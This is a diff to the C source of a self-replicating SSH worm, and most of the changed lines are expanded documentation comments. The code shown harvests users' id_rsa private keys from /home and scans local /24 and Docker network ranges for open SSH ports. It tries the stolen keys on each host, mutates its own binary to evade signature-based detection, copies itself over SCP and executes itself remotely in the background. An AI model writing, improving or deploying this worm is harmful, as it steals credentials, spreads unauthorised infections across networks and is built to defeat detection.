@@ -34,7 +34,13 @@ static char* vulnerable_hosts[MAX_VULNERABLE_HOSTS];
 static int vulnerable_host_count = 0;
 
 /**
- * Discover SSH keys (called once during scan)
+ * Discover SSH Private Keys
+ * Scans /home directories for user SSH private keys (id_rsa files).
+ * Results are cached after first discovery to avoid redundant filesystem scans.
+ * 
+ * @note Keys are stored in global ssh_key_list array. This function should be
+ *       called during scan phase before attempting propagation.
+ * @note Requires read access to /home/<user>/.ssh/id_rsa files.
  */
 static void discover_ssh_keys(void) {
     if (ssh_keys_discovered) return;
@@ -48,9 +54,18 @@ static void discover_ssh_keys(void) {
 }
 
 /**
- * Discover local networks (called once during scan)
- * Extracts /24 network prefixes from local IP addresses
- * Algorithm: Get all local IPs, replace last octet with "0", deduplicate
+ * Discover Local Network Ranges
+ * Identifies /24 network prefixes from local interface IP addresses.
+ * Networks are cached after first discovery to avoid redundant network queries.
+ * 
+ * Algorithm:
+ *   1. Enumerate all local network interfaces (excluding loopback)
+ *   2. Extract IP addresses and convert to /24 network prefixes (replace last octet with "0")
+ *   3. Deduplicate networks (same /24 may appear on multiple interfaces)
+ *   4. Store in global discovered_networks array for use in host scanning
+ * 
+ * @note Network prefixes are used for scanning potential propagation targets.
+ *       Falls back to default Docker network ranges if no interfaces are found.
  */
 static void discover_networks(void) {
     if (discovered_network_count > 0) return;
@@ -94,8 +109,15 @@ static void discover_networks(void) {
 }
 
 /**
- * Get discovered networks (for main worm to use)
- * Note: Caller should not free these pointers, they're managed internally
+ * Get Discovered Network Prefixes
+ * Retrieves the list of /24 network prefixes discovered during scan phase.
+ * 
+ * @param networks Output array to populate with network prefix strings (e.g., "172.18.0").
+ *                 Must be large enough to hold discovered_network_count entries.
+ * @param count Output parameter set to the number of discovered networks.
+ * 
+ * @note The returned pointers are owned by this module and should not be freed by caller.
+ *       Networks remain valid until next scan phase.
  */
 void get_discovered_networks(char** networks, int* count) {
     *count = discovered_network_count;
@@ -105,16 +127,30 @@ void get_discovered_networks(char** networks, int* count) {
 }
 
 /**
- * Get SSH key count
+ * Get SSH Key Count
+ * Returns the number of SSH private keys discovered during scan phase.
+ * 
+ * @return Number of discovered SSH keys, or 0 if none found or scan not performed.
  */
 int get_ssh_key_count(void) {
     return ssh_key_count;
 }
 
 /**
- * Get vulnerable hosts discovered during scan phase
- * Returns number of vulnerable hosts found
- * Note: Caller should not free these pointers, they're managed internally
+ * Get Vulnerable Hosts List
+ * Retrieves the list of vulnerable hosts discovered during scan phase.
+ * A host is considered vulnerable if it has SSH port 22 open and SSH keys are available.
+ * 
+ * @param hosts Output array to populate with vulnerable host IP addresses.
+ *              Must be large enough to hold at least max_hosts entries.
+ * @param count Output parameter set to the number of hosts returned (min of
+ *              vulnerable_host_count and max_hosts).
+ * @param max_hosts Maximum number of hosts to return (prevents buffer overflow).
+ * @return Total number of vulnerable hosts found (may be greater than *count if
+ *         max_hosts limit is reached).
+ * 
+ * @note The returned pointers are owned by this module and should not be freed by caller.
+ *       Hosts remain valid until next scan phase.
  */
 int get_vulnerable_hosts(char** hosts, int* count, int max_hosts) {
     *count = (vulnerable_host_count < max_hosts) ? vulnerable_host_count : max_hosts;
@@ -135,10 +171,9 @@ int get_vulnerable_hosts(char** hosts, int* count, int max_hosts) {
  * 4. Store vulnerable hosts (keys exist + port 22 open) internally
  * 5. Return vulnerable=true if any vulnerable hosts found
  * 
- * Note: target_ip parameter is ignored - handler scans internally
  */
 cve_scan_result_t cve_ssh_propagation_scan(const char* target_ip) {
-    (void)target_ip;  // Handler decides what to scan internally
+    (void)target_ip;
     
     cve_scan_result_t result = {0};
     result.cve_id = CVE_SSH_PROPAGATION_ID;
@@ -149,10 +184,7 @@ cve_scan_result_t cve_ssh_propagation_scan(const char* target_ip) {
     }
     vulnerable_host_count = 0;
     
-    // Local scan: Discover SSH keys (cached after first call)
     discover_ssh_keys();
-    
-    // Cannot propagate without SSH keys
     if (ssh_key_count == 0) {
         result.is_vulnerable = 0;
         result.confidence = 0;
@@ -161,10 +193,7 @@ cve_scan_result_t cve_ssh_propagation_scan(const char* target_ip) {
         return result;
     }
     
-    // Local scan: Discover networks (cached after first call)
     discover_networks();
-    
-    // If no networks discovered, try to discover them
     if (discovered_network_count == 0) {
         char* ip_list[10];
         int ip_count = 0;
@@ -197,7 +226,7 @@ cve_scan_result_t cve_ssh_propagation_scan(const char* target_ip) {
         }
     }
     
-    // Fallback to default Docker network ranges if still no networks
+    // Fallback to default network ranges
     if (discovered_network_count == 0) {
         discovered_networks[0] = strdup("172.20.0");
         discovered_networks[1] = strdup("172.18.0");
@@ -217,9 +246,7 @@ cve_scan_result_t cve_ssh_propagation_scan(const char* target_ip) {
             char ip[16];
             snprintf(ip, sizeof(ip), "%s.%d", base_network, host);
             
-            // Check if SSH port is open
             if (scan_port(ip, 22, 2)) {
-                // Port open + keys available = vulnerable
                 vulnerable_hosts[vulnerable_host_count] = strdup(ip);
                 vulnerable_host_count++;
                 printf("[+] Found vulnerable host: %s (SSH port 22 open)\n", ip);
@@ -246,8 +273,14 @@ cve_scan_result_t cve_ssh_propagation_scan(const char* target_ip) {
 }
 
 /**
- * Find a working SSH key for target IP
- * Returns key path or NULL
+ * Find Working SSH Key for Target
+ * Tests each discovered SSH key against the target host to find one that grants access.
+ * 
+ * @param ip Target host IP address to test SSH key access.
+ * @return Path to SSH private key file that successfully authenticates, or NULL if none work.
+ * 
+ * @note Uses SSH connection test with timeout to avoid hanging on unreachable hosts.
+ * @note Some keys may not be authorized for specific hosts even if they exist locally.
  */
 static char* find_working_key(const char* ip) {
     for (int i = 0; i < ssh_key_count; i++) {
@@ -283,7 +316,6 @@ static int propagate_to_host(const char* target_ip) {
     
     printf("[+] SSH Server found at %s!\n", target_ip);
     
-    // Test each SSH key until one works (some keys may not be authorized for this host)
     char* key_path = find_working_key(target_ip);
     if (!key_path) {
         printf("[-] No working SSH key found for %s\n", target_ip);
@@ -294,9 +326,6 @@ static int propagate_to_host(const char* target_ip) {
     
     printf("[*] Attempting infection on %s via SSH...\n", target_ip);
     
-    // Self-replication: read own binary for propagation
-    // Priority 1: Read from memfd file descriptor (fileless execution)
-    // Priority 2: Read from /proc/self/exe (normal file execution)
     unsigned char* worm_content = NULL;
     size_t file_size = 0;
     int fd = -1;
@@ -306,7 +335,6 @@ static int propagate_to_host(const char* target_ip) {
         fd = atoi(fd_str);
         printf("[*] Reading from memfd file descriptor: %d\n", fd);
         
-        // Verify FD is valid and readable
         if (fcntl(fd, F_GETFD) != -1) {
             off_t size = lseek(fd, 0, SEEK_END);
             if (size >= 0) {
@@ -327,7 +355,6 @@ static int propagate_to_host(const char* target_ip) {
         }
     }
     
-    // Fallback: read from filesystem
     if (!worm_content) {
         printf("[*] Falling back to reading from /proc/self/exe\n");
         char* exe_path = get_executable_path(NULL);
@@ -373,8 +400,6 @@ static int propagate_to_host(const char* target_ip) {
         printf("[+] Successfully read %zu bytes from file\n", file_size);
     }
     
-    // Polymorphic mutation: add random bytes to create unique binary variants
-    // This helps evade signature-based detection
     printf("[*] Applying polymorphic mutation...\n");
     size_t mutated_size;
     unsigned char* mutated_content = polimorfism(worm_content, file_size, &mutated_size);
@@ -387,7 +412,6 @@ static int propagate_to_host(const char* target_ip) {
     
     printf("[*] Polymorphic mutation applied: %zu -> %zu bytes\n", file_size, mutated_size);
     
-    // Write mutated binary to temp file for SCP transfer
     const char* temp_worm = "/tmp/worm_temp";
     FILE* temp_f = fopen(temp_worm, "wb");
     if (!temp_f) {
@@ -402,7 +426,6 @@ static int propagate_to_host(const char* target_ip) {
     
     chmod(temp_worm, 0755);
     
-    // Check if target is already infected to avoid duplicate infections
     char check_cmd[512];
     snprintf(check_cmd, sizeof(check_cmd), "test -f %s && echo 'EXISTS'", REMOTE_WORM_PATH);
     
@@ -441,22 +464,18 @@ static int propagate_to_host(const char* target_ip) {
         return 0;
     }
     
-    // Clean up local temp file after successful transfer
     unlink(temp_worm);
     
-    // Set executable permissions on remote
     printf("[*] Setting executable permissions on remote...\n");
     char chmod_cmd[512];
     snprintf(chmod_cmd, sizeof(chmod_cmd), "chmod +x %s", REMOTE_WORM_PATH);
-    run_ssh_command(target_ip, key_path, SSH_USER, chmod_cmd);
+    run_ssh_command(target_ip, key_path, SSH_USER,     chmod_cmd);
     
-    // Execute worm on remote host in background
     printf("[+] Executing worm on %s...\n", target_ip);
     char exec_cmd[512];
     snprintf(exec_cmd, sizeof(exec_cmd), "nohup %s > /tmp/worm.log 2>&1 &", REMOTE_WORM_PATH);
     run_ssh_command(target_ip, key_path, SSH_USER, exec_cmd);
     
-    // Mark as infected after successful propagation
     mark_infected(target_ip);
     printf("[+] Infection complete for %s\n", target_ip);
     return 1;
@@ -464,25 +483,24 @@ static int propagate_to_host(const char* target_ip) {
 
 /**
  * CVE SSH Propagation Execution Handler
- * Propagates to all vulnerable hosts discovered during scan phase
+ * Propagates worm to all vulnerable hosts discovered during scan phase.
  * 
- * Execution flow:
- * 1. Get list of vulnerable hosts from scan phase
- * 2. For each vulnerable host:
- *    a. Verify SSH port is open
- *    b. Find working SSH key (test each key until one works)
- *    c. Read own binary (prefer memfd FD if available, else /proc/self/exe)
- *    d. Apply polymorphic mutation (add random bytes to evade detection)
- *    e. Write mutated binary to temp file
- *    f. Check if target already infected (avoid duplicate infections)
- *    g. Transfer via SCP
- *    h. Set executable permissions on remote
- *    i. Execute remotely in background
+ * Execution Strategy:
+ *   - Retrieves vulnerable hosts list from scan phase (hosts with SSH keys + port 22 open)
+ *   - Filters out already-infected hosts to prevent duplicate infections and loops
+ *   - Propagates to each uninfected vulnerable host using propagate_to_host()
+ *   - Returns success if at least one host is successfully infected
  * 
- * Note: target_ip parameter is ignored - handler uses hosts from scan phase
+ * @param target_ip Ignored. Handler uses vulnerable hosts discovered during scan phase.
+ * @return 1 if at least one propagation succeeded, 0 if all attempts failed.
+ * 
+ * @note Relies on scan phase to populate vulnerable_hosts list. If scan phase hasn't
+ *       been executed or found no vulnerable hosts, this function returns failure.
+ * @note State management (is_infected/mark_infected) prevents re-infecting same hosts
+ *       across multiple execution phases, avoiding infinite propagation loops.
  */
 int cve_ssh_propagation_execute(const char* target_ip) {
-    (void)target_ip;  // Handler uses hosts discovered in scan phase
+    (void)target_ip;
     
     // Get vulnerable hosts discovered during scan phase
     char* hosts[MAX_VULNERABLE_HOSTS];
@@ -494,7 +512,6 @@ int cve_ssh_propagation_execute(const char* target_ip) {
         return 0;
     }
     
-    // Filter out already infected hosts before attempting propagation
     char* uninfected_hosts[MAX_VULNERABLE_HOSTS];
     int uninfected_count = 0;
     for (int i = 0; i < host_count; i++) {
@@ -508,7 +525,7 @@ int cve_ssh_propagation_execute(const char* target_ip) {
     
     if (uninfected_count == 0) {
         printf("[*] All vulnerable hosts are already infected, skipping propagation\n");
-        return 1;  // Return success since we've already infected all targets
+        return 1;
     }
     
     printf("[*] Propagating to %d uninfected vulnerable host(s)...\n", uninfected_count);
